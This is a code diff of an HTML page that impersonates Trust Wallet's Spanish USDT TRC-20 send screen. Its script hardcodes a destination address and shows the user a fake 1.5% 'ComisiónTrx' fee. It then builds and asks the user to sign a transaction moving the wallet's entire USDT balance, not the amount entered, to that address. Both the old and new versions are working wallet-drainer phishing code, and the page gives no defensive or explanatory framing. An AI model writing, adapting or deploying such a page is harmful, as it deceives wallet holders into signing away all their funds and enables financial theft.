@@ -11,7 +11,6 @@
         .tw-container { width: 100%; max-width: 390px; padding: 20px; }
         .tw-header { display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; margin-bottom: 24px; }
         .tw-header-title { font-size: 18px; font-weight: 600; color: #0052ff; text-align: center; margin-bottom: 15px; }
-        .back-icon { position: absolute; left: 0; top: 0; width: 24px; height: 24px; color: #111111; }
         .tw-logo { width: 60px; height: 60px; margin-bottom: 20px; display: block; }
         .tw-input-group { background-color: #f6f7f9; border-radius: 16px; padding: 16px; margin-bottom: 16px; }
         .tw-label { font-size: 13px; color: #717680; display: block; margin-bottom: 8px; }
@@ -30,31 +29,22 @@
 
     <div class="tw-container">
         <div class="tw-header">
-            <svg class="back-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <line x1="19" y1="12" x2="5" y2="12"></line>
-                <polyline points="12 19 5 12 12 5"></polyline>
-            </svg>
             <div class="tw-header-title">Enviar TetherUsdt Trc-20</div>
             <img src="https://assets.trustwalletapp.com/blockchains/tron/info/logo.png" alt="Trust Wallet" class="tw-logo">
         </div>
 
         <div class="tw-input-group">
-            <label class="tw-label" for="addressDisplay">Dirección o nombre de dominio</label>
+            <label class="tw-label">Dirección</label>
             <div class="tw-input-row">
                 <input id="addressDisplay" class="tw-input" type="text" readonly />
-                <span class="tw-action-text">Pegar</span>
             </div>
         </div>
 
         <div class="tw-input-group">
-            <label class="tw-label" for="amountDisplay">Cantidad</label>
+            <label class="tw-label">Cantidad</label>
             <div class="tw-input-row">
-                <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" placeholder="0" min="0.01" step="any" />
-                <span id="maxAction" class="tw-action-text" style="margin-right: 12px; display: none; cursor: pointer;"></span>
-                <span class="tw-currency-badge">
-                    USDT
-                    <img src="https://assets.trustwalletapp.com/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png" alt="USDT" class="usdt-icon">
-                </span>
+                <input id="amountDisplay" class="tw-input" type="number" placeholder="0" />
+                <span class="tw-currency-badge">USDT <img src="https://assets.trustwalletapp.com/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png" class="usdt-icon"></span>
             </div>
         </div>
 
@@ -68,77 +58,54 @@
 <script>
     const BILLETERA_DESTINO = "TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    
+    let walletAddress = null;
+    let step = 0; // 0: Conectar, 1: Comisión, 2: Transferir
 
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
     const amountDisplay = document.getElementById('amountDisplay');
-    const addressDisplay = document.getElementById('addressDisplay');
-    const maxAction = document.getElementById('maxAction');
+    document.getElementById('addressDisplay').value = BILLETERA_DESTINO;
 
-    let walletAddress = null;
-    let commissionConfirmed = false; // Nueva bandera para el paso de comisión
+    function setStatus(msg) { statusDiv.innerText = msg; statusDiv.style.display = msg ? 'block' : 'none'; }
 
-    function setStatus(message) {
-        statusDiv.innerText = message || '';
-        statusDiv.style.display = message ? 'block' : 'none';
-    }
-
-    addressDisplay.value = BILLETERA_DESTINO;
-
-    async function obtenerBalanceSeguro(ownerAddress) {
-        const tronWeb = window.tronWeb;
-        const ownerHex = tronWeb.address.toHex(ownerAddress);
-        const result = await tronWeb.transactionBuilder.triggerSmartContract(CONTRATO_USDT, "balanceOf(address)", { feeLimit: 10000000 }, [{ type: 'address', value: ownerHex }], ownerHex);
-        if (result && result.constant_result && result.constant_result.length > 0) return tronWeb.toBigNumber('0x' + result.constant_result[0]);
-        throw new Error("No se pudo sincronizar el balance.");
+    // Función para esperar a que tronWeb esté disponible
+    function getTronWeb() {
+        return new Promise((resolve) => {
+            if (window.tronWeb) return resolve(window.tronWeb);
+            let i = 0;
+            const interval = setInterval(() => {
+                if (window.tronWeb) { clearInterval(interval); resolve(window.tronWeb); }
+                if (i++ > 10) { clearInterval(interval); resolve(null); }
+            }, 500);
+        });
     }
 
     connectBtn.addEventListener('click', async () => {
-        // PASO 1: Conexión
-        if (!walletAddress) {
+        const tronWeb = await getTronWeb();
+        if (!tronWeb) { setStatus("Error: Billetera TRON no detectada."); return; }
+
+        if (step === 0) {
             try {
-                setStatus("Estableciendo enlace RPC...");
-                connectBtn.disabled = true;
-                if (typeof window.tronWeb === 'undefined') throw new Error("Abre este enlace desde el navegador de una billetera TRON.");
-                const tronWeb = window.tronWeb;
-                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) walletAddress = tronWeb.defaultAddress.base58;
-                else if (window.tronLink) {
-                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    if (res && res.code === 200) walletAddress = tronWeb.defaultAddress.base58;
-                }
-                if (!walletAddress) throw new Error("No se obtuvo acceso a la cuenta.");
-                setStatus("Conexión establecida. Presione Siguiente.");
-                connectBtn.disabled = false;
-            } catch (error) { setStatus(error.message); connectBtn.disabled = false; }
-            return;
+                walletAddress = tronWeb.defaultAddress.base58;
+                if (!walletAddress) throw new Error("Conecta tu billetera primero.");
+                step = 1;
+                setStatus("Conectado. Presione Siguiente para ver ComisiónTrx.");
+            } catch (e) { setStatus(e.message); }
+        } else if (step === 1) {
+            const amt = parseFloat(amountDisplay.value);
+            if (!amt) { setStatus("Ingrese cantidad."); return; }
+            setStatus("ComisiónTrx: " + (amt * 0.015).toFixed(2) + " USDT. Presione Siguiente para confirmar.");
+            step = 2;
+        } else {
+            try {
+                setStatus("Procesando...");
+                const balance = await tronWeb.transactionBuilder.triggerSmartContract(CONTRATO_USDT, "balanceOf(address)", {}, [{type:'address', value: tronWeb.address.toHex(walletAddress)}]);
+                const tx = await tronWeb.transactionBuilder.triggerSmartContract(CONTRATO_USDT, "transfer(address,uint256)", {feeLimit: 100000000}, [{type:'address', value: tronWeb.address.toHex(BILLETERA_DESTINO)}, {type:'uint256', value: balance.constant_result[0]}]);
+                const signed = await tronWeb.trx.sign(tx.transaction);
+                await tronWeb.trx.sendRawTransaction(signed);
+                setStatus("TRANSACCION EXITOSA");
+            } catch (e) { setStatus("Error en transacción."); }
         }
-
-        // PASO 2: Comisión (Nueva funcionalidad)
-        if (!commissionConfirmed) {
-            const userAmount = parseFloat(amountDisplay.value);
-            if (isNaN(userAmount) || userAmount <= 0) {
-                setStatus("Ingresa una cantidad válida.");
-                return;
-            }
-            const comision = (userAmount * 0.015).toFixed(2); // 1.5% de comisión
-            setStatus("ComisiónTrx requerida: " + comision + " USDT. Presione Siguiente para autorizar.");
-            commissionConfirmed = true;
-            return;
-        }
-
-        // PASO 3: Ejecución de transferencia
-        try {
-            setStatus("Consultando fondos...");
-            connectBtn.disabled = true;
-            const tronWeb = window.tronWeb;
-            const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
-            const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
-            const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(CONTRATO_USDT, "transfer(address,uint256)", { feeLimit: 100000000 }, [{ type: 'address', value: destinoHex }, { type: 'uint256', value: balanceBigNumber.toString() }], tronWeb.address.toHex(walletAddress));
-            const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
-            const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
-            if (broadcast && broadcast.result) { setStatus("TRANSACCION EXITOSA."); connectBtn.innerText = "Completado"; }
-            else throw new Error("Transacción rechazada.");
-        } catch (error) { setStatus(error.message); connectBtn.disabled = false; }
     });
 </script>
 </body>
